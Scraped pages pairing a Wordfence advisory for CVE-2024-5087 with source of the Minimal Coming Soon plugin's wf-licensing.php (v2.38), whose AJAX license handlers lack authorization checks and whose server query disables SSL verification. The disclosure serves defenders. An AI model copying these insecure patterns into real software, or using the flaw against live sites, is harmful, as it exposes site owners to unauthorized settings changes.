| [600](#L600) | $out['license\_key'] = trim(sanitize\_text\_field($\_POST['license\_key'])); |
| [601](#L601) |  |
| [602](#L602) | if (sanitize\_text\_field($\_POST['success']) == 'true') { |
| [603](#L603) | $out['error'] = trim(sanitize\_text\_field($\_POST['data']['error'])); |
| [604](#L604) | $out['name'] = trim(sanitize\_text\_field($\_POST['data']['name'])); |
| [605](#L605) | $out['valid\_until'] = trim(sanitize\_text\_field($\_POST['data']['valid\_until'])); |
| [606](#L606) | $out['meta'] = sanitize\_text\_field($\_POST['data']['meta']); |
| [607](#L607) | } else { |
| [608](#L608) | $out['error'] = trim(sanitize\_text\_field($\_POST['data'])); |
| [609](#L609) | $out['name'] = ''; |
| [610](#L610) | $out['valid\_until'] = ''; |
| [611](#L611) | $out['meta'] = array(); |
| [612](#L612) | } |
| [613](#L613) | $out['last\_check'] = time(); |
| [614](#L614) |  |
| [615](#L615) | $this->update\_license($out); |
| [616](#L616) | do\_action('wf\_licensing\_' . $this->prefix . 'save\_ajax', $out); |
| [617](#L617) |  |
| [618](#L618) | wp\_send\_json\_success(); |
| [619](#L619) | } // save\_ajax |
| [620](#L620) |  |
| [621](#L621) |  |
| [622](#L622) | function prepare\_server\_query\_data($action) |
| [623](#L623) | { |
| [624](#L624) | $license = $this->get\_license(); |
| [625](#L625) |  |
| [626](#L626) | $query\_data = array( |
| [627](#L627) | 'action' => $action, |
| [628](#L628) | 'license\_key' => $license['license\_key'], |
| [629](#L629) | 'rand' => rand(1000, 9999), |
| [630](#L630) | 'version' => $this->version, |
| [631](#L631) | 'wp\_version' => get\_bloginfo('version'), |
| [632](#L632) | 'site\_url' => get\_home\_url(), |
| [633](#L633) | 'site\_title' => get\_bloginfo('name'), |
| [634](#L634) | 'access\_key' => $license['access\_key'], |
| [635](#L635) | 'meta' => apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_query\_server\_meta', array(), $action) |
| [636](#L636) | ); |
| [637](#L637) |  |
| [638](#L638) | if (substr($action, 0, 7) == 'remote\_') { |
| [639](#L639) | unset($query\_data['action'], $query\_data['license\_key']); |
| [640](#L640) | } |
| [641](#L641) |  |
| [642](#L642) | return $query\_data; |
| [643](#L643) | } // prepare\_server\_query\_data |
| [644](#L644) |  |
| [645](#L645) |  |
| [646](#L646) | /\*\* |
| [647](#L647) | \* Run license server query. |
| [648](#L648) | \* |
| [649](#L649) | \* @param string $action |
| [650](#L650) | \* @param array $data |
| [651](#L651) | \* |
| [652](#L652) | \* @return string response|bool |
| [653](#L653) | \*/ |
| [654](#L654) | function query\_licensing\_server($action, $data = array()) |
| [655](#L655) | { |
| [656](#L656) | $license = $this->get\_license(); |
| [657](#L657) |  |
| [658](#L658) | $request\_params = array('sslverify' => false, 'timeout' => 25, 'redirection' => 2); |
| [659](#L659) | $default\_data = $this->prepare\_server\_query\_data($action); |
| [660](#L660) |  |
| [661](#L661) | $request\_data = array\_merge($default\_data, $data, array('action' => $action)); |
| [662](#L662) | $request\_data = apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_query\_server\_data', $request\_data, $action); |
| [663](#L663) | array\_walk\_recursive($request\_data, function (&$val, $ind) { |
| [664](#L664) | $val = rawurlencode($val); |
| [665](#L665) | }); |
| [666](#L666) |  |
| [667](#L667) | $this->log('query licensing server', $request\_data); |
| [668](#L668) |  |
| [669](#L669) | $url = rtrim(add\_query\_arg($request\_data, trailingslashit($this->licensing\_servers[0] . $this->api\_ver)), '&'); |
| [670](#L670) |  |
| [671](#L671) | $response = wp\_remote\_get($url, $request\_params); |
| [672](#L672) |  |
| [673](#L673) | $body = wp\_remote\_retrieve\_body($response); |
| [674](#L674) | $result = @json\_decode($body, true); |
| [675](#L675) |  |
| [676](#L676) | $this->log('licensing server response', $response); |
| [677](#L677) |  |
| [678](#L678) | if (is\_wp\_error($response) || empty($body) || !is\_array($result) || !isset($result['success'])) { |
| [679](#L679) | if (is\_wp\_error($response)) { |
| [680](#L680) | return $response; |
| [681](#L681) | } else { |
| [682](#L682) | return new WP\_Error(1, 'Invalid server response format.'); |
| [683](#L683) | } |
| [684](#L684) | } else { |
| [685](#L685) | return $result; |
| [686](#L686) | } |
| [687](#L687) | } // query\_licensing\_server |
| [688](#L688) | } // WF\_Licensing\_CSMM |
| [689](#L689) | } // if WF\_Licensing\_CSMM |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php?format=txt)
* [Original Format](/export/3220669/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from www.wordfence.com_1c6efd2e_20250111_113437.html ===


[![](https://www.wordfence.com/img/wordfence-intelligence-logo.svg)](/threat-intel/)

Have you found a vulnerability in a WordPress plugin or theme? Report vulnerabilities in WordPress plugins and themes through our [bug bounty program](https://www.wordfence.com/threat-intel/bug-bounty-program) and earn a bounty on all in-scope submissions, while we handle the responsible disclosure process on your behalf.

As a reminder, the Wordfence Intelligence Vulnerability Database API is completely free to query and utilize, both personally and commercially, and contains all the same vulnerability data as the user interface. Please review the API documentation and Webhook documentation for more information on how to query the vulnerability API endpoints and configure webhooks utilizing all the same data present in the Wordfence Intelligence user interface.

# Minimal Coming Soon – Coming Soon Page <= 2.38 - Missing Authorization to Limited Settings Change

 [Wordfence Intelligence](https://www.wordfence.com/threat-intel)   >    [Vulnerability Database](https://www.wordfence.com/threat-intel/vulnerabilities)   >   Minimal Coming Soon – Coming Soon Page <= 2.38 - Missing Authorization to Limited Settings Change

6.3

**Missing Authorization**
**CVSS Vector**
[CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)

| CVE | [CVE-2024-5087](https://www.cve.org/CVERecord?id=CVE-2024-5087) |
| --- | --- |
| CVSS | 6.3 (Medium) |
| Publicly Published | June 7, 2024 |
| Last Updated | June 8, 2024 |
| Researcher | [Foxyyy](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/friderika-baranyai) |

### Description

The Minimal Coming Soon – Coming Soon Page plugin for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the validate\_ajax, deactivate\_ajax, and save\_ajax functions in all versions up to, and including, 2.38. This makes it possible for authenticated attackers, with Subscriber-level access and above, to edit the license key, which could disable features of the plugin.

#### References

* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php#L51)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php#L52)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php#L54)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php#L561)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php#L585)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php#L596)
* [github.com](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset/3099123/)

#### Share

[Facebook](https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fminimal-coming-soon-maintenance-mode%2Fminimal-coming-soon-coming-soon-page-238-missing-authorization-to-limited-settings-change&t=Minimal%20Coming%20Soon%20%E2%80%93%20Coming%20Soon%20Page%20%3C%3D%202.38%20-%20Missing%20Authorization%20to%20Limited%20Settings%20Change "Facebook")
[Twitter](https://twitter.com/share?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fminimal-coming-soon-maintenance-mode%2Fminimal-coming-soon-coming-soon-page-238-missing-authorization-to-limited-settings-change&text=Minimal%20Coming%20Soon%20%E2%80%93%20Coming%20Soon%20Page%20%3C%3D%202.38%20-%20Missing%20Authorization%20to%20Limited%20Settings%20Change "Twitter")
[LinkedIn](https://www.linkedin.com/shareArticle?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fminimal-coming-soon-maintenance-mode%2Fminimal-coming-soon-coming-soon-page-238-missing-authorization-to-limited-settings-change "LinkedIn")
Email

## Vulnerability Details for Minimal Coming Soon – Coming Soon Page

#### [Minimal Coming Soon – Coming Soon Page](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/minimal-coming-soon-maintenance-mode)

| Software Type | Plugin |
| --- | --- |
| Software Slug | minimal-coming-soon-maintenance-mode [(view on wordpress.org)](https://wordpress.org/plugins/minimal-coming-soon-maintenance-mode) |
| Patched? | Yes |
| Remediation | Update to version 2.39, or a newer patched version |
| Affected Version | * <= 2.38 |
| Patched Version | * 2.39 |

This record contains material that is subject to copyright.

**Copyright 2012-2025 Defiant Inc.**

**License:**
Defiant hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute this software vulnerability information. Any copy of the software vulnerability information you make for such purposes is authorized provided that you include a hyperlink to this vulnerability record and reproduce Defiant's copyright designation and this license in any such copy.
**[Read more.](https://www.wordfence.com/wordfence-intelligence-terms-and-conditions/)**

**Copyright 1999-2025 The MITRE Corporation**

**License:**
CVE Usage: MITRE hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute Common Vulnerabilities and Exposures (CVE®). Any copy you make for such purposes is authorized provided that you reproduce MITRE's copyright designation and this license in any such copy.
**[Read more.](https://www.cve.org/Legal/TermsOfUse)**

Have information to add, or spot any errors? Contact us at wfi-support@wordfence.com so we can make any appropriate adjustments.

Did you know Wordfence Intelligence provides free personal and commercial API access to our comprehensive WordPress vulnerability database, along with a free webhook integration to stay on top of the latest vulnerabilities added and updated in the database? Get started today!

Learn more

Want to get notified of the latest vulnerabilities that may affect your WordPress site?
 Install Wordfence on your site today to get notified immediately if your site is affected by a vulnerability that has been added to our database.

Get Wordfence

The Wordfence Intelligence WordPress vulnerability database is completely free to access and query via API. Please review the documentation on how to access and consume the vulnerability data via API.

Documentation



=== Content from plugins.trac.wordpress.org_4343cd3a_20250111_113432.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fminimal-coming-soon-maintenance-mode%2Ftags%2F2.38%2Fframework%2Fwf-licensing.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Revision](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=2543111 "Revision 2543111")
* [Next Revision](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=3099123 "Revision 3099123") →
* [Blame](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php)

---

# [source:](/browser?order=name "Go to repository root") [minimal-coming-soon-maintenance-mode](/browser/minimal-coming-soon-maintenance-mode?order=name "View minimal-coming-soon-maintenance-mode")/[tags](/browser/minimal-coming-soon-maintenance-mode/tags?order=name "View tags")/[2.38](/browser/minimal-coming-soon-maintenance-mode/tags/2.38?order=name "View 2.38")/[framework](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework?order=name "View framework")/[wf-licensing.php](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php?order=name "View wf-licensing.php")

View diff against:

View revision:

| [Last change](/changeset/3031149/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php "View differences") on this file was [3031149](/changeset/3031149/ "View changeset 3031149"), checked in by WebFactory, [11 months ago](/timeline?from=2024-02-04T14%3A33%3A27Z&precision=second "See timeline at 02/04/2024 02:33:27 PM") |
| --- |
| Bug fixes |
| **File size:** 20.8 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) | if (false === class\_exists('WF\_Licensing\_CSMM')) { |
| [3](#L3) | class WF\_Licensing\_CSMM |
| [4](#L4) | { |
| [5](#L5) | public $prefix = ''; |
| [6](#L6) | private $licensing\_servers = array(); |
| [7](#L7) | private $version = ''; |
| [8](#L8) | private $slug = ''; |
| [9](#L9) | private $basename = ''; |
| [10](#L10) | private $plugin\_page = ''; |
| [11](#L11) | private $plugin\_file = ''; |
| [12](#L12) | private $js\_folder = ''; |
| [13](#L13) | protected $api\_ver = 'v1/'; |
| [14](#L14) | protected $valid\_forever = '2035-01-01'; |
| [15](#L15) | protected $unlimited\_installs = 99999; |
| [16](#L16) | public $disable\_remote = true; |
| [17](#L17) | public $debug = false; |
| [18](#L18) |  |
| [19](#L19) |  |
| [20](#L20) | /\*\* |
| [21](#L21) | \* Init licensing by setting up various params and hooking into actions. |
| [22](#L22) | \* |
| [23](#L23) | \* @param array $params Prefix, licensing\_servers, version, plugin\_file, skip\_hooks |
| [24](#L24) | \* |
| [25](#L25) | \* @return void |
| [26](#L26) | \*/ |
| [27](#L27) | function \_\_construct($params) |
| [28](#L28) | { |
| [29](#L29) | $this->prefix = trim($params['prefix']); |
| [30](#L30) | $this->licensing\_servers = $params['licensing\_servers']; |
| [31](#L31) | $this->version = trim($params['version']); |
| [32](#L32) | $this->slug = dirname(plugin\_basename(trim($params['plugin\_file']))); |
| [33](#L33) | $this->basename = plugin\_basename(trim($params['plugin\_file'])); |
| [34](#L34) | $this->plugin\_file = $params['plugin\_file']; |
| [35](#L35) | $this->plugin\_page = trim($params['plugin\_page']); |
| [36](#L36) | $this->disable\_remote = !empty($params['disable\_remote']); |
| [37](#L37) | $this->debug = !empty($params['debug']); |
| [38](#L38) |  |
| [39](#L39) | if ($params['js\_folder']) { |
| [40](#L40) | $this->js\_folder = trim($params['js\_folder']); |
| [41](#L41) | } else { |
| [42](#L42) | $this->js\_folder = plugin\_dir\_url($this->plugin\_file) . 'js/'; |
| [43](#L43) | } |
| [44](#L44) |  |
| [45](#L45) | if (empty($params['skip\_hooks'])) { |
| [46](#L46) | register\_activation\_hook($this->plugin\_file, array($this, 'activate\_plugin')); |
| [47](#L47) | register\_deactivation\_hook($this->plugin\_file, array($this, 'deactivate\_plugin')); |
| [48](#L48) |  |
| [49](#L49) | add\_action('init', array($this, 'init')); |
| [50](#L50) |  |
| [51](#L51) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_validate', array($this, 'validate\_ajax')); |
| [52](#L52) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_save', array($this, 'save\_ajax')); |
| [53](#L53) |  |
| [54](#L54) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_deactivate', array($this, 'deactivate\_ajax')); |
| [55](#L55) | } |
| [56](#L56) |  |
| [57](#L57) | $this->log('\_\_construct', $params, get\_object\_vars($this)); |
| [58](#L58) |  |
| [59](#L59) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_refresh', array($this, 'remote\_action\_refresh')); |
| [60](#L60) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_deactivate\_license', array($this, 'remote\_action\_deactivate\_license')); |
| [61](#L61) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_validate\_license', array($this, 'remote\_action\_validate\_license')); |
| [62](#L62) |  |
| [63](#L63) | add\_action('plugins\_loaded', array($this, 'monitor\_remote\_actions')); |
| [64](#L64) | } // \_\_construct |
| [65](#L65) |  |
| [66](#L66) |  |
| [67](#L67) | /\*\* |
| [68](#L68) | \* Actions performed on WP init action. |
| [69](#L69) | \* |
| [70](#L70) | \* @return void |
| [71](#L71) | \*/ |
| [72](#L72) | function init() |
| [73](#L73) | { |
| [74](#L74) | if (is\_admin()) { |
| [75](#L75) | add\_action('admin\_enqueue\_scripts', array($this, 'admin\_enqueue\_scripts')); |
| [76](#L76) | } |
| [77](#L77) | } // init |
| [78](#L78) |  |
| [79](#L79) |  |
| [80](#L80) | function admin\_enqueue\_scripts() { |
| [81](#L81) | $current\_screen = get\_current\_screen(); |
| [82](#L82) |  |
| [83](#L83) | if (empty($current\_screen->id) || $current\_screen->id != $this->plugin\_page) { |
| [84](#L84) | return false; |
| [85](#L85) | } |
| [86](#L86) |  |
| [87](#L87) | $vars = array( |
| [88](#L88) | 'prefix' => $this->prefix, |
| [89](#L89) | 'debug' => $this->debug, |
| [90](#L90) | 'nonce' => wp\_create\_nonce('wf\_licensing\_' . $this->prefix), |
| [91](#L91) | 'licensing\_endpoint' => $this->licensing\_servers[0] . $this->api\_ver, |
| [92](#L92) | 'request\_data' => array( |
| [93](#L93) | 'action' => 'validate\_license', |
| [94](#L94) | 'license\_key' => '', |
| [95](#L95) | 'rand' => rand(1000, 9999), |
| [96](#L96) | 'version' => $this->version, |
| [97](#L97) | 'wp\_version' => get\_bloginfo('version'), |
| [98](#L98) | 'site\_url' => get\_home\_url(), |
| [99](#L99) | 'site\_title' => get\_bloginfo('name'), |
| [100](#L100) | 'meta' => array() |
| [101](#L101) | ) |
| [102](#L102) | ); |
| [103](#L103) |  |
| [104](#L104) | wp\_enqueue\_script('wf\_licensing', $this->js\_folder . 'wf-licensing.js', array(), 1.0, true); |
| [105](#L105) | wp\_localize\_script('wf\_licensing', 'wf\_licensing\_' . $this->prefix, $vars); |
| [106](#L106) | } // admin\_enqueue\_scripts |
| [107](#L107) |  |
| [108](#L108) |  |
| [109](#L109) | function monitor\_remote\_actions() |
| [110](#L110) | { |
| [111](#L111) | if ($this->disable\_remote || is\_admin()) { |
| [112](#L112) | return; |
| [113](#L113) | } |
| [114](#L114) |  |
| [115](#L115) | if (!empty($\_REQUEST[$this->prefix . '\_access\_key']) && !empty($\_REQUEST[$this->prefix . '\_action']) && isset($\_REQUEST[$this->prefix . '\_action\_params'])) { |
| [116](#L116) | $access\_key = substr(trim($\_REQUEST[$this->prefix . '\_access\_key']), 0, 32); |
| [117](#L117) | $action = substr(trim($\_REQUEST[$this->prefix . '\_action']), 0, 32); |
| [118](#L118) | $action\_params = $\_REQUEST[$this->prefix . '\_action\_params']; |
| [119](#L119) | $rand = substr($\_REQUEST[$this->prefix . '\_rand'], 0, 5); |
| [120](#L120) | $rand = preg\_replace("/[^0-9]/", '', $rand); |
| [121](#L121) |  |
| [122](#L122) | nocache\_headers(); |
| [123](#L123) | header('X-WF-Licensing-' . $this->prefix . ': ' . $this->version); |
| [124](#L124) |  |
| [125](#L125) | if (strlen($rand) != 5) { |
| [126](#L126) | wp\_send\_json\_error('Invalid random value.'); |
| [127](#L127) | } |
| [128](#L128) |  |
| [129](#L129) | if (false == $this->is\_active(false, false, true)) { |
| [130](#L130) | wp\_send\_json\_error('License is not active.'); |
| [131](#L131) | } |
| [132](#L132) |  |
| [133](#L133) | if (false == $this->is\_remote\_action($action)) { |
| [134](#L134) | wp\_send\_json\_error('Unknown remote action.'); |
| [135](#L135) | } |
| [136](#L136) |  |
| [137](#L137) | $access\_key = preg\_replace("/[^0-9a-zA-Z]/", '', $access\_key); |
| [138](#L138) | if (strlen($access\_key) != 32) { |
| [139](#L139) | wp\_send\_json\_error('Invalid access key format.'); |
| [140](#L140) | } |
| [141](#L141) |  |
| [142](#L142) | $license = $this->get\_license(); |
| [143](#L143) | if ($access\_key != $license['access\_key']) { |
| [144](#L144) | wp\_send\_json\_error('Invalid access key.'); |
| [145](#L145) | } |
| [146](#L146) |  |
| [147](#L147) | $post\_data = @json\_decode(file\_get\_contents('php://input'), true); |
| [148](#L148) | do\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_' . $action, $action\_params, $this, $post\_data); |
| [149](#L149) |  |
| [150](#L150) | wp\_send\_json\_error('Remote action did not execute.'); |
| [151](#L151) | die(); |
| [152](#L152) | } |
| [153](#L153) | } // monitor\_remote\_actions |
| [154](#L154) |  |
| [155](#L155) |  |
| [156](#L156) | function remote\_action\_refresh($action\_params) |
| [157](#L157) | { |
| [158](#L158) | $data = $this->prepare\_server\_query\_data('remote\_refresh'); |
| [159](#L159) |  |
| [160](#L160) | wp\_send\_json\_success($data); |
| [161](#L161) | } // remote\_action\_refresh |
| [162](#L162) |  |
| [163](#L163) |  |
| [164](#L164) | function remote\_action\_validate\_license($action\_params) |
| [165](#L165) | { |
| [166](#L166) | $validate = $this->validate(); |
| [167](#L167) | $license = $this->get\_license(); |
| [168](#L168) |  |
| [169](#L169) | wp\_send\_json\_success(array('validate' => $validate, 'license' => $license)); |
| [170](#L170) | } // remote\_action\_validate\_license |
| [171](#L171) |  |
| [172](#L172) |  |
| [173](#L173) | function remote\_action\_deactivate\_license($action\_params) |
| [174](#L174) | { |
| [175](#L175) | $license = $this->get\_license(); |
| [176](#L176) | $this->update\_license(false); |
| [177](#L177) |  |
| [178](#L178) | if ($action\_params['keep\_license\_key']) { |
| [179](#L179) | $tmp = array('error' => 'License is no longer valid for this site.', 'license\_key' => $license['license\_key']); |
| [180](#L180) | $this->update\_license($tmp); |
| [181](#L181) | } |
| [182](#L182) |  |
| [183](#L183) | wp\_send\_json\_success(); |
| [184](#L184) | } // remote\_action\_deactivate\_license |
| [185](#L185) |  |
| [186](#L186) |  |
| [187](#L187) | private function is\_remote\_action($action) |
| [188](#L188) | { |
| [189](#L189) | $actions = array('refresh', 'validate\_license', 'deactivate\_license'); |
| [190](#L190) | $actions = apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_actions', $actions); |
| [191](#L191) |  |
| [192](#L192) | if (in\_array($action, $actions)) { |
| [193](#L193) | return true; |
| [194](#L194) | } else { |
| [195](#L195) | return false; |
| [196](#L196) | } |
| [197](#L197) | } // is\_remote\_action |
| [198](#L198) |  |
| [199](#L199) |  |
| [200](#L200) | /\*\* |
| [201](#L201) | \* Log message if debugging is enabled. |
| [202](#L202) | \* Log file: /wp-content/wf-licensing.log |
| [203](#L203) | \* |
| [204](#L204) | \* @param string $message Message to write to log. |
| [205](#L205) | \* @param mixed $data Optional, extra data to write to debug log. |
| [206](#L206) | \* |
| [207](#L207) | \* @return void |
| [208](#L208) | \*/ |
| [209](#L209) | function log($message, ...$data) |
| [210](#L210) | { |
| [211](#L211) | if (!$this->debug) { |
| [212](#L212) | return; |
| [213](#L213) | } |
| [214](#L214) |  |
| [215](#L215) | $log\_file = trailingslashit(WP\_CONTENT\_DIR) . 'wf-licensing.log'; |
| [216](#L216) | $fp = fopen($log\_file, 'a+'); |
| [217](#L217) |  |
| [218](#L218) | fputs($fp, '[' . date('r') . '] ' . $this->prefix . ': '); |
| [219](#L219) | fputs($fp, (string) $message . PHP\_EOL); |
| [220](#L220) | foreach ($data as $tmp) { |
| [221](#L221) | fputs($fp, print\_r($tmp, true)); |
| [222](#L222) | } |
| [223](#L223) |  |
| [224](#L224) | fputs($fp, PHP\_EOL); |
| [225](#L225) | fclose($fp); |
| [226](#L226) | } // log |
| [227](#L227) |  |
| [228](#L228) |  |
| [229](#L229) | /\*\* |
| [230](#L230) | \* Fetches license details from the database. |
| [231](#L231) | \* |
| [232](#L232) | \* @param string $key If set returns only requested options key. |
| [233](#L233) | \* |
| [234](#L234) | \* @return string |
| [235](#L235) | \*/ |
| [236](#L236) | function get\_license($key = '') |
| [237](#L237) | { |
| [238](#L238) | $default = array( |
| [239](#L239) | 'license\_key' => '', |
| [240](#L240) | 'error' => '', |
| [241](#L241) | 'valid\_until' => '', |
| [242](#L242) | 'last\_check' => 0, |
| [243](#L243) | 'name' => '', |
| [244](#L244) | 'access\_key' => '', |
| [245](#L245) | 'meta' => array() |
| [246](#L246) | ); |
| [247](#L247) |  |
| [248](#L248) | $options = get\_option('wf\_licensing\_' . $this->prefix, array()); |
| [249](#L249) | $options = array\_merge($default, $options); |
| [250](#L250) |  |
| [251](#L251) | if (empty($options['access\_key'])) { |
| [252](#L252) | $options['access\_key'] = $this->generate\_access\_key(); |
| [253](#L253) | $this->update\_license($options); |
| [254](#L254) | } |
| [255](#L255) |  |
| [256](#L256) | if (!empty($key)) { |
| [257](#L257) | return $options[$key]; |
| [258](#L258) | } else { |
| [259](#L259) | return $options; |
| [260](#L260) | } |
| [261](#L261) | } // get\_license |
| [262](#L262) |  |
| [263](#L263) |  |
| [264](#L264) | function generate\_access\_key() |
| [265](#L265) | { |
| [266](#L266) | $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; |
| [267](#L267) | $pieces = array(); |
| [268](#L268) | $max = strlen($keyspace) - 1; |
| [269](#L269) |  |
| [270](#L270) | for ($i = 0; $i < 32; ++$i) { |
| [271](#L271) | $pieces[] = $keyspace[random\_int(0, $max)]; |
| [272](#L272) | } |
| [273](#L273) | return implode('', $pieces); |
| [274](#L274) | } // generate\_access\_key |
| [275](#L275) |  |
| [276](#L276) |  |
| [277](#L277) | function get\_license\_formatted($key = '') |
| [278](#L278) | { |
| [279](#L279) | $license = $this->get\_license(); |
| [280](#L280) | $out = array( |
| [281](#L281) | 'name' => '', |
| [282](#L282) | 'name\_long' => '', |
| [283](#L283) | 'valid\_until' => '', |
| [284](#L284) | 'expires' => '', |
| [285](#L285) | 'license\_key' => '', |
| [286](#L286) | 'license\_key\_hidden' => '', |
| [287](#L287) | 'recurring' => false, |
| [288](#L288) | 'keyless' => false, |
| [289](#L289) | ); |
| [290](#L290) |  |
| [291](#L291) | if (!$this->is\_active()) { |
| [292](#L292) | return $out; |
| [293](#L293) | } |
| [294](#L294) | $license['valid\_until'] = $license['valid\_until']; |
| [295](#L295) |  |
| [296](#L296) | $out['name'] = $license['name']; |
| [297](#L297) | $out['name\_long'] = $license['name']; |
| [298](#L298) | if ($license['meta']) { |
| [299](#L299) | $tmp = ''; |
| [300](#L300) | foreach ($license['meta'] as $meta => $meta\_value) { |
| [301](#L301) |  |
| [302](#L302) | if ($meta[0] == '\_' || filter\_var($meta\_value, FILTER\_VALIDATE\_BOOLEAN) != true) { |
| [303](#L303) | continue; |
| [304](#L304) | } |
| [305](#L305) | $meta = str\_replace('\_', ' ', $meta); |
| [306](#L306) | $meta = ucwords($meta); |
| [307](#L307) | $tmp .= $meta . ', '; |
| [308](#L308) | } |
